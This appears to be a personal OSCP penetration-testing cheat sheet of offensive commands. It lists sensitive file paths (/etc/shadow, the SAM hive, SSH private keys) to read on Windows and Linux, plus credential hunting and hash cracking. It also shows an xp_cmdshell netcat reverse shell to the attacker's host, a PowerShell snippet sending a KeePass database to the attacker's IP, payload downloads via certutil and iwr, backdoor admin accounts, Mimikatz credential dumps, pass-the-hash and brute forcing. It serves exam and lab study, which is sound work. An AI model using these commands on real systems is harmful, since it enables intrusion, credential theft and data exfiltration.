# OSCP Commands

**Preparing as part of my OSCP Certificate.**




  
<aside>
💡 For Finding all important files in Windows:(CTF Style)

`cd c:\Users` then
`tree /F`

</aside>



## Important Locations

<details>
<summary>Windows</summary>
Windows
    
    ```powershell
    C:/Users/Administrator/NTUser.dat
    C:/Documents and Settings/Administrator/NTUser.dat
    C:/apache/logs/access.log
    C:/apache/logs/error.log
    C:/apache/php/php.ini
    C:/boot.ini
    C:/inetpub/wwwroot/global.asa
    C:/MySQL/data/hostname.err
    C:/MySQL/data/mysql.err
    C:/MySQL/data/mysql.log
    C:/MySQL/my.cnf
    C:/MySQL/my.ini
    C:/php4/php.ini
    C:/php5/php.ini
    C:/php/php.ini
    C:/Program Files/Apache Group/Apache2/conf/httpd.conf
    C:/Program Files/Apache Group/Apache/conf/httpd.conf
    C:/Program Files/Apache Group/Apache/logs/access.log
    C:/Program Files/Apache Group/Apache/logs/error.log
    C:/Program Files/FileZilla Server/FileZilla Server.xml
    C:/Program Files/MySQL/data/hostname.err
    C:/Program Files/MySQL/data/mysql-bin.log
    C:/Program Files/MySQL/data/mysql.err
    C:/Program Files/MySQL/data/mysql.log
    C:/Program Files/MySQL/my.ini
    C:/Program Files/MySQL/my.cnf
    C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
    C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
    C:/Program Files/MySQL/MySQL Server 5.0/my.ini
    C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
    C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
    C:/Program Files (x86)/Apache Group/Apache/conf/access.log
    C:/Program Files (x86)/Apache Group/Apache/conf/error.log
    C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
    C:/Program Files (x86)/xampp/apache/conf/httpd.conf
    C:/WINDOWS/php.ini
    C:/WINDOWS/Repair/SAM
    C:/Windows/repair/system
    C:/Windows/repair/software
    C:/Windows/repair/security
    C:/WINDOWS/System32/drivers/etc/hosts
    C:/Windows/win.ini
    C:/WINNT/php.ini
    C:/WINNT/win.ini
    C:/xampp/apache/bin/php.ini
    C:/xampp/apache/logs/access.log
    C:/xampp/apache/logs/error.log
    C:/Windows/Panther/Unattend/Unattended.xml
    C:/Windows/Panther/Unattended.xml
    C:/Windows/debug/NetSetup.log
    C:/Windows/system32/config/AppEvent.Evt
    C:/Windows/system32/config/SecEvent.Evt
    C:/Windows/system32/config/default.sav
    C:/Windows/system32/config/security.sav
    C:/Windows/system32/config/software.sav
    C:/Windows/system32/config/system.sav
    C:/Windows/system32/config/regback/default
    C:/Windows/system32/config/regback/sam
    C:/Windows/system32/config/regback/security
    C:/Windows/system32/config/regback/system
    C:/Windows/system32/config/regback/software
    C:/Program Files/MySQL/MySQL Server 5.1/my.ini
    C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
    C:/Windows/System32/inetsrv/config/applicationHost.config
    C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
    ```
</details>
<details>
<summary>Linux</summary>
    
    ```powershell
    /etc/passwd
    /etc/shadow
    /etc/aliases
    /etc/anacrontab
    /etc/apache2/apache2.conf
    /etc/apache2/httpd.conf
    /etc/apache2/sites-enabled/000-default.conf
    /etc/at.allow
    /etc/at.deny
    /etc/bashrc
    /etc/bootptab
    /etc/chrootUsers
    /etc/chttp.conf
    /etc/cron.allow
    /etc/cron.deny
    /etc/crontab
    /etc/cups/cupsd.conf
    /etc/exports
    /etc/fstab
    /etc/ftpaccess
    /etc/ftpchroot
    /etc/ftphosts
    /etc/groups
    /etc/grub.conf
    /etc/hosts
    /etc/hosts.allow
    /etc/hosts.deny
    /etc/httpd/access.conf
    /etc/httpd/conf/httpd.conf
    /etc/httpd/httpd.conf
    /etc/httpd/logs/access_log
    /etc/httpd/logs/access.log
    /etc/httpd/logs/error_log
    /etc/httpd/logs/error.log
    /etc/httpd/php.ini
    /etc/httpd/srm.conf
    /etc/inetd.conf
    /etc/inittab
    /etc/issue
    /etc/knockd.conf
    /etc/lighttpd.conf
    /etc/lilo.conf
    /etc/logrotate.d/ftp
    /etc/logrotate.d/proftpd
    /etc/logrotate.d/vsftpd.log
    /etc/lsb-release
    /etc/motd
    /etc/modules.conf
    /etc/motd
    /etc/mtab
    /etc/my.cnf
    /etc/my.conf
    /etc/mysql/my.cnf
    /etc/network/interfaces
    /etc/networks
    /etc/npasswd
    /etc/passwd
    /etc/php4.4/fcgi/php.ini
    /etc/php4/apache2/php.ini
    /etc/php4/apache/php.ini
    /etc/php4/cgi/php.ini
    /etc/php4/apache2/php.ini
    /etc/php5/apache2/php.ini
    /etc/php5/apache/php.ini
    /etc/php/apache2/php.ini
    /etc/php/apache/php.ini
    /etc/php/cgi/php.ini
    /etc/php.ini
    /etc/php/php4/php.ini
    /etc/php/php.ini
    /etc/printcap
    /etc/profile
    /etc/proftp.conf
    /etc/proftpd/proftpd.conf
    /etc/pure-ftpd.conf
    /etc/pureftpd.passwd
    /etc/pureftpd.pdb
    /etc/pure-ftpd/pure-ftpd.conf
    /etc/pure-ftpd/pure-ftpd.pdb
    /etc/pure-ftpd/putreftpd.pdb
    /etc/redhat-release
    /etc/resolv.conf
    /etc/samba/smb.conf
    /etc/snmpd.conf
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /etc/ssh/ssh_host_dsa_key
    /etc/ssh/ssh_host_dsa_key.pub
    /etc/ssh/ssh_host_key
    /etc/ssh/ssh_host_key.pub
    /etc/sysconfig/network
    /etc/syslog.conf
    /etc/termcap
    /etc/vhcs2/proftpd/proftpd.conf
    /etc/vsftpd.chroot_list
    /etc/vsftpd.conf
    /etc/vsftpd/vsftpd.conf
    /etc/wu-ftpd/ftpaccess
    /etc/wu-ftpd/ftphosts
    /etc/wu-ftpd/ftpusers
    /logs/pure-ftpd.log
    /logs/security_debug_log
    /logs/security_log
    /opt/lampp/etc/httpd.conf
    /opt/xampp/etc/php.ini
    /proc/cmdline
    /proc/cpuinfo
    /proc/filesystems
    /proc/interrupts
    /proc/ioports
    /proc/meminfo
    /proc/modules
    /proc/mounts
    /proc/net/arp
    /proc/net/tcp
    /proc/net/udp
    /proc/<PID>/cmdline
    /proc/<PID>/maps
    /proc/sched_debug
    /proc/self/cwd/app.py
    /proc/self/environ
    /proc/self/net/arp
    /proc/stat
    /proc/swaps
    /proc/version
    /root/anaconda-ks.cfg
    /usr/etc/pure-ftpd.conf
    /usr/lib/php.ini
    /usr/lib/php/php.ini
    /usr/local/apache/conf/modsec.conf
    /usr/local/apache/conf/php.ini
    /usr/local/apache/log
    /usr/local/apache/logs
    /usr/local/apache/logs/access_log
    /usr/local/apache/logs/access.log
    /usr/local/apache/audit_log
    /usr/local/apache/error_log
    /usr/local/apache/error.log
    /usr/local/cpanel/logs
    /usr/local/cpanel/logs/access_log
    /usr/local/cpanel/logs/error_log
    /usr/local/cpanel/logs/license_log
    /usr/local/cpanel/logs/login_log
    /usr/local/cpanel/logs/stats_log
    /usr/local/etc/httpd/logs/access_log
    /usr/local/etc/httpd/logs/error_log
    /usr/local/etc/php.ini
    /usr/local/etc/pure-ftpd.conf
    /usr/local/etc/pureftpd.pdb
    /usr/local/lib/php.ini
    /usr/local/php4/httpd.conf
    /usr/local/php4/httpd.conf.php
    /usr/local/php4/lib/php.ini
    /usr/local/php5/httpd.conf
    /usr/local/php5/httpd.conf.php
    /usr/local/php5/lib/php.ini
    /usr/local/php/httpd.conf
    /usr/local/php/httpd.conf.ini
    /usr/local/php/lib/php.ini
    /usr/local/pureftpd/etc/pure-ftpd.conf
    /usr/local/pureftpd/etc/pureftpd.pdn
    /usr/local/pureftpd/sbin/pure-config.pl
    /usr/local/www/logs/httpd_log
    /usr/local/Zend/etc/php.ini
    /usr/sbin/pure-config.pl
    /var/adm/log/xferlog
    /var/apache2/config.inc
    /var/apache/logs/access_log
    /var/apache/logs/error_log
    /var/cpanel/cpanel.config
    /var/lib/mysql/my.cnf
    /var/lib/mysql/mysql/user.MYD
    /var/local/www/conf/php.ini
    /var/log/apache2/access_log
    /var/log/apache2/access.log
    /var/log/apache2/error_log
    /var/log/apache2/error.log
    /var/log/apache/access_log
    /var/log/apache/access.log
    /var/log/apache/error_log
    /var/log/apache/error.log
    /var/log/apache-ssl/access.log
    /var/log/apache-ssl/error.log
    /var/log/auth.log
    /var/log/boot
    /var/htmp
    /var/log/chttp.log
    /var/log/cups/error.log
    /var/log/daemon.log
    /var/log/debug
    /var/log/dmesg
    /var/log/dpkg.log
    /var/log/exim_mainlog
    /var/log/exim/mainlog
    /var/log/exim_paniclog
    /var/log/exim.paniclog
    /var/log/exim_rejectlog
    /var/log/exim/rejectlog
    /var/log/faillog
    /var/log/ftplog
    /var/log/ftp-proxy
    /var/log/ftp-proxy/ftp-proxy.log
    /var/log/httpd-access.log
    /var/log/httpd/access_log
    /var/log/httpd/access.log
    /var/log/httpd/error_log
    /var/log/httpd/error.log
    /var/log/httpsd/ssl.access_log
    /var/log/httpsd/ssl_log
    /var/log/kern.log
    /var/log/lastlog
    /var/log/lighttpd/access.log
    /var/log/lighttpd/error.log
    /var/log/lighttpd/lighttpd.access.log
    /var/log/lighttpd/lighttpd.error.log
    /var/log/mail.info
    /var/log/mail.log
    /var/log/maillog
    /var/log/mail.warn
    /var/log/message
    /var/log/messages
    /var/log/mysqlderror.log
    /var/log/mysql.log
    /var/log/mysql/mysql-bin.log
    /var/log/mysql/mysql.log
    /var/log/mysql/mysql-slow.log
    /var/log/proftpd
    /var/log/pureftpd.log
    /var/log/pure-ftpd/pure-ftpd.log
    /var/log/secure
    /var/log/vsftpd.log
    /var/log/wtmp
    /var/log/xferlog
    /var/log/yum.log
    /var/mysql.log
    /var/run/utmp
    /var/spool/cron/crontabs/root
    /var/webmin/miniserv.log
    /var/www/html<VHOST>/__init__.py
    /var/www/html/db_connect.php
    /var/www/html/utils.php
    /var/www/log/access_log
    /var/www/log/error_log
    /var/www/logs/access_log
    /var/www/logs/error_log
    /var/www/logs/access.log
    /var/www/logs/error.log
    ~/.atfp_history
    ~/.bash_history
    ~/.bash_logout
    ~/.bash_profile
    ~/.bashrc
    ~/.gtkrc
    ~/.login
    ~/.logout
    ~/.mysql_history
    ~/.nano_history
    ~/.php_history
    ~/.profile
    ~/.ssh/authorized_keys
    #id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa
    ~/.ssh/id_dsa
    ~/.ssh/id_dsa.pub
    ~/.ssh/id_rsa
    ~/.ssh/id_edcsa
    ~/.ssh/id_rsa.pub
    ~/.ssh/identity
    ~/.ssh/identity.pub
    ~/.viminfo
    ~/.wm_style
    ~/.Xdefaults
    ~/.xinitrc
    ~/.Xresources
    ~/.xsession
    ```
</details>

**Discovering KDBX files**
- Getting passwords from the .kdbx files [Kpcli ](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#kpcli---keepass-password-manager)
1. In Windows
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
2. In Linux
```bash
find / -name *.kdbx 2>/dev/null
```
### For loop
- If you have multiple files to read using for loop you can read.
- For
```bash
#Here .xml multiple files, so change based on the requirement.
for file in *.xml; do echo "Reading $file:"; cat "$file"; echo "------------------------"; done
# Grep for username and password
for file in *.xml; do echo "Reading $file:"; cat "$file"; echo "------------------------"; done | grep pa  
```


### GitHub recon

- You need to find traces of the `.git` files on the target machine.
- Now navigate to the directory where the file is located, a potential repository.
- Commands

```jsx
# Log information of the current repository.
git log

# This will display the log of the stuff happened, like commit history which is very useful
git show <commit-id>

# This shows the commit information and the newly added stuff.
```
### GitHub Dump
- If you identify `.git` active on the website. Use https://github.com/arthaud/git-dumper now it downloads all the files and saves it locally. Perform the same above commands and escalate.
- Find the logs using git log command, then save the output in one file, automation script for git show [Github](https://github.com/ashok5141/OSCP/blob/main/RevShells/process_git_commits.py)
- Some useful GitHub dorks: [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets) → this might not be relevant to the exam environment.
```powershell
git log > git_output.txt
python3 process_git_commits.py
# It will provide the information in each commit and save the output in a text file.
```


## Connecting to RDP

```bash
xfreerdp /u:uname /p:'pass' /v:IP
xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
xfreerdp /u:user /p:'password' /v:<IP> /smart-sizing:1920x1080 /cert-ignore #Fullscreen
xfreerdp /u:uname /p:'pass' /v:IP +clipboard #try this option if normal login doesn't work
```

## Adding SSH Public key

- This can be used to get ssh session, on target machine which is based on linux

```jsx
ssh-keygen -t rsa -b 4096 #give any password

#This created both id_rsa and id_rsa.pub in ~/.ssh directory
#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
chmod 700 ~/.ssh
nano ~/.ssh/authorized_keys #enter the copied content here
chmod 600 ~/.ssh/authorized_keys 

#On Attacker machine
ssh username@target_ip #enter password if you gave any
```

## File Transfers

- Netcat

```bash
#Attacker
nc <target_ip> 1234 < nmap
# Error due to '<'
powershell>Get-Content .\Database.kdbx | .\nc.exe <target_ip> 1234

#Target
nc -lvp 1234 > nmap
```
- Powershell File transfer
- Then if you have rdp you can add /drive:/tmp,tmp at the end of your command and it will map tmp on kali to tmp on client. Super easy to just drag and drop files.  Putting spoiler tags but don't really think file transfer techniques are spoilers.
- RDP /drive:/tmp in file transfer
- Check out discord link above message [Discord](https://discord.com/channels/780824470113615893/1087927556604432424/1278089984737411092), [GitHub](https://github.com/ashok5141/OSCP/blob/main/TransferFIles.MD)

```powershell

From Windows:   First start kali NC command
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.182", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\jim\Documents\Database.kdbx")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > Database.kdbx
```
- Downloading on Windows

```powershell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```

- Downloading on Linux

```powershell
wget http://lhost/file
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

### kali to Windows
- I saw the situation, Powershell not opening so we can't try the iwr
- In cmd certutil not found

```powershell
kali> impacket-smbserver -smb2support <sharename> .
net view \\KaliIP
win> copy file \\KaliIP\sharename
```

## Adding Users

### Windows

```powershell
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
```

### Linux

```powershell
adduser <uname> #Interactive
useradd <uname>

useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, this command is to add a user to a specific group
```

## Password-Hash Cracking

*Hash Analyzer*: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)  </br>
## Password file saw in offsec discord 500-worst-passwords.txt 
### Hash Identifier
- Identify the hash types using these tools
```powershell
hashid <FILE>
name-that-hash -f <FILE>
```
### fcrackzip

```powershell
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
```

### John
- Sometimes hashcat not able to crack the krb5tgs, but johnhash cracked

> [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)
> 
- If there’s an encrypted file, try to convert it into john hash and crack.

```powershell
ssh2john.py id_rsa > hash
#Convert the obtained hash to John format(above link)
john hashfile --wordlist=rockyou.txt

#Krb5tgs file changed from sql_svc147.hash to sql_svc.hash
john -w=/home/kali/HTB/OSCP/rockyou.txt sql_svc.hash
john -w=/home/kali/HTB/OSCP/rockyou.txt ./sql_svc.hash -format=krb5tgs
#Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) , No password hashes left to crack (see FAQ)
# Means that password hash is cracked
john sql_svc.hash --show
```

### zip2john
- Crack the password of the zip file using zip2john tool.
```bash
zip2john sitebackup3.zip > sitebackup3.hash
john -w=/home/kali/HTB/OSCP/rockyou.txt sitebackup3.hash
```
### Zip file Encrption find
- If a file .zip is protected with password, you can identify using the
```bash
7z l -slt file
```

### keepass2John
During the Initial enumeration process of the target with smbclient -L //target or smbclient -L ////target found Database.kdbx file in User directory.
```powershell
keepass2john Database.kdbx > keepass.hash
john keepass.hash
or
hashcat --help | grep "KeePass" 
hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt
```
### Hex password Crack
- Dealing with Hex format password like this "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f"
- For more information [HacktheBox Cascade AD Machine](https://app.hackthebox.com/machines/235), [github](https://github.com/frizb/PasswordDecrypts)
```powershell
msfconsole -q
msf5 > irb
key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
true
Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
# password is sT333ve2
```

### Hashcat

> [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
> 

```powershell
#Obtain the Hash module number 
hashcat -m <number> hash wordlists.txt --force
```

## Pivoting through SSH and Dual SSH tunnel
- Windows AD MS01 (192.168.193.147 or 10.10.153.147), Internal Network(10.10.153.148), Kali IP(192.168.45.220)
- I had situation in windows active directory internal network communicated with tunnel Ligolo-NG.
-  but then get access to the partial shell of the internal network(.148) from here unable to connect the kali(220).
-  In this situation, I created dynamic port forwarding using ssh.
-  Port 7777 used for transmitting data from kali(220) to Internal Network(148) through MS01(147)
-  Same with port 8888 getting shell from Internal Network(148) to kali(220) through MS01(147)
-  Below shell commands from [MSSQL](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#sql-injection) in that Manual Code Execution.

```bash
ssh user@192.168.193.147 -D9090 -R :7777:localhost:7777 -R:8888:localhost:8888
#python server
python3 -m http.server 7777 #Kali
xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/nc.exe -Outfile C:\Users\Public\nc.exe #Internal machine

#Reverse shell used port 8888
xp_cmdshell powershell -c C:\Users\Public\nc.exe 10.10.153.147 8888 -e cmd #Internal machine
rlwrap nc -nlvp 8888  #Kali
 #Got shell


#SSH with 
ssh adminuser@10.10.155.5 -i id_rsa -D 9050 #TOR port

#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
proxychains4 crackmapexec smb 10.10.10.0/24 #Example



```

## Dealing with Passwords

- When there’s a scope for bruteforce or hash-cracking then try the following,
    - Have a valid usernames first
    - Dont firget trying `admin:admin`
    - Try `username:username` as first credential
    - If it’s related to a service, try default passwords.
    - Service name as the username as well as the same name for password.
    - Use Rockyou.txt
- Some default passwords to always try out!

```jsx
password
password1
Password1
Password@123
password@123
admin
administrator
admin@123
```

## Impacket

```bash
smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share

lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target

services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration

secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target

GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS

GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list

##RCE
psexec.py test.local/john:password123@10.10.10.1
psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

smbexec.py test.local/john:password123@10.10.10.1
smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

atexec.py test.local/john:password123@10.10.10.1 <command>
atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>

```

## Evil-Winrm
- If evil-winrm us not working for services try the username$ doller sign at end of user

```bash
##winrm service discovery
nmap -p5985,5986 <IP>
5985 - plaintext protocol
5986 - encrypted

# Doller Sign for Heist from PG Practice
netexec winrm 192.168.177.165 -u svc_apache$ -H FC258E893FBB2444E5E7327348164F4A # Checking for shell
evil-winrm -u svc_apache$ -H FC258E893FBB2444E5E7327348164F4A -i heist.offsec

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> #not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

## Mimikatz

```powershell
privilege::debug

token::elevate

sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

```

## Ligolo-ng

```powershell
#Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

#Kali machine - Attacker machine
./proxy -laddr 0.0.0.0:11601 -selfcert (# Here port customise option)
or
./Lproxy -selfcert

#windows or linux machine - compromised machine, default port can customise
agent.exe -connect <LHOST>:11601 -ignore-cert

#In Ligolo-ng console
session #select host
ifconfig #Notedown the internal network's subnet
start #after adding relevent subnet to ligolo interface

#Adding subnet to ligolo interface - Kali linux
sudo ip r add xxx.xxx.xxx.0/24 dev ligolo

```

---

# Recon and Enumeration


- OSINT OR Passive Recon
    
    <aside>
    💡 Not that useful for OSCP as we’ll be dealing with internal machines
    
    </aside>
    
    - whois: `whois <domain>` or `whois <domain> -h <IP>`
    - Google dorking,
        - site
        - filetype
        - intitle
        - GHDB - Google hacking database
    - OS and Service Information using [searchdns.netcraft.com](http://searchdns.netcraft.com)
    - Github dorking
        - filename
        - user
        - A tool called Gitleaks for automated enumeration
    - Shodan dorks
        - hostname
        - port
        - Then gather infor by going through the options
    - Scanning Security headers and SSL/TLS using [https://securityheaders.com/](https://securityheaders.com/)
    
## Metadata Username
- FTP has an anonymous login found some files like photos, pdfs etc
- Using ExifTool can find the metadata like usernames and sometimes password.
```bash
exiftool <FILE>
exiftool FUNCTION-TEMPLATE.pdf | grep Author
```

## Port Scanning

### Nmap for OSCP
- Here is the Nmap commands in Kali split 4 terminals

```bash
mkdir Nmap
nmap -sC -sV --open -p- -T4 -A -oN Nmap/<Name>xxx -Pn 192.168.xxx.xxx

#UDP
sudo nmap -sU -sC -sV --open -p- -T4 -A -oN Nmap/<Name>xxx -Pn 192.168.xxx.xxx

autorecon <IP ADDRESS>6 # It will generate results folder
tree results
# Check for results/IP/scans folder
sudo sh -c 'echo "<IP> <HOSTNAME>" >> /etc/hosts' # Add into /etc/hosts

```

```powershell
#use -Pn option if you're getting nothing in scan
nmap -sC -sV <IP> -v #Basic scan
nmap -T4 -A -p- <IP> -v #complete scan
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124 #running vuln category scripts

#NSE
updatedb
locate .nse | grep <name>
sudo nmap --script="name" <IP> #here we can specify other options like specific ports...etc

Test-NetConnection -Port <port> <IP>   #powershell utility

1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null #automating port scan of first 1024 ports in powershell
```

## FTP enumeration
- FTP bulk download [here](https://apple.stackexchange.com/questions/18106/how-do-i-download-folders-through-ftp-in-terminal)

```powershell
ftp <IP>
#login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith anonymous:password

put <file> #uploading file
get <file> #downloading file

# Download bulk all, with anonymous login
wget -m ftp://anonymous:anonymous@10.10.10.98 # If it fails do to passive mode below command
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
wget -r ftp://Anonymous:pass@$IP
wget -r -l 10 --ftp-user='anonymous' --ftp-password='anonymous' ftp://192.168.104.140:20001/* # Hepet PG Practice

#NSE
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>

#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice-versa
hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ftp

#check for vulnerabilities associated with the version identified.
```

## SSH enumeration

```powershell
#Login
ssh uname@IP #enter password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack them using John

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce
hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice-versa
hydra -L users.txt -P pass.txt <IP> ssh -s 2222
hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ssh

#check for vulnerabilities associated with the version identified.
```

## SMB enumeration
- If don't find try RPC [RPC Enumeration](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#rpc-enumeration)
- Rpcclient>querydispinfo for more info check above link RPC Enumeration

```powershell
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided

#NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" $IP 

#In windows we can view like this
net view \\<computername/IP> /all

#crackmapexec
crackmapexec smb <IP/range>  
crackmapexec smb 192.168.1.100 -u username -p password
crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
crackmapexec smb 192.168.1.100 -u username -p password --all #all information
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
crackmapexec smb --pass-pol <IP>
#Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.

# Smbclient with username and password
smbclient -L //IP #or try with 4 /'s
smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username
smbclient //<IP Address or Hostname>/<Share Name> -U <username>%<password>


#SMBCLIENT Shell, Download multiple file using, It will download only file not folders
mget *     # Every time need to click yes, yes ..


#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip>5 -u anonymous -d localhost
smbmap -H <target_ip>   -u anonymous -d HTB.LOCAL
smbmap -u L4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134 # Ippsec's HTB Bastion
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

#Within SMB session
put <file> #to upload file
get <file> #to download file

# SMB Shell with impacket-smbclient, Resourced PG Pracice  https://www.youtube.com/watch?v=xMTCZt5DRB0
impacket-smbclient v.Ventz:'HotelCalifornia194!'@192.168.177.175 # Resourced PG Pracice


# Exploit finder faced old machine line (445/tcp, open, microsoft-ds syn-ack ttl 125 Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP))
nmap --script smb-vuln* -p 139,445 -oN smb-vuln-scan 192.168.177.40  # Internal pg practice
#https://www.trenchesofit.com/2020/11/24/offensive-security-proving-grounds-internal-write-up-no-metasploit/ #old exploit eternal blue
#https://pentesting.zeyu2001.com/proving-grounds/warm-up/internal
```

- Downloading shares made easy - if the folder consists of several files, they all be downloading by this.

```powershell
mask ""
recurse ON
prompt OFF
mget *
```
## SMB to Mount
- In the SMBCLIENT has the directory with .vhd file, using guestmount mounted to locally.
- Reference IPPSEC HTB Bastion video
```bash
sudo apt-get install libguestfs-tools
sudo apt-get install cifs-utils
# 7z hash option to list the .vhd file
7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd  # Found that windows/system32/confing so we can dump sam and system files
mkdir /mnt/vhd
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
#Check in the /mnt/vhd
```

## HTTP/S enumeration & Directory Buster

- Check with whatweb 'URL'
- View source-code and identify any hidden content. If some image looks suspicious download and try to find hidden data in it.
- Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
- check /robots.txt folder
- Look for the hostname and add the relevant one to `/etc/hosts` file.
- Directory and file discovery - Obtain any hidden files which may contain juicy information
  

```powershell
dirbuster
gobuster dir -u http://example.com -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
```

- Vulnerability Scanning using nikto: `nikto -h <url>`
- `HTTPS`SSL certificate inspection, this may reveal information like subdomains, usernames…etc
- Default credentials, Identify the CMS or service and check for default credentials and test them out.
- Bruteforce

```powershell
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
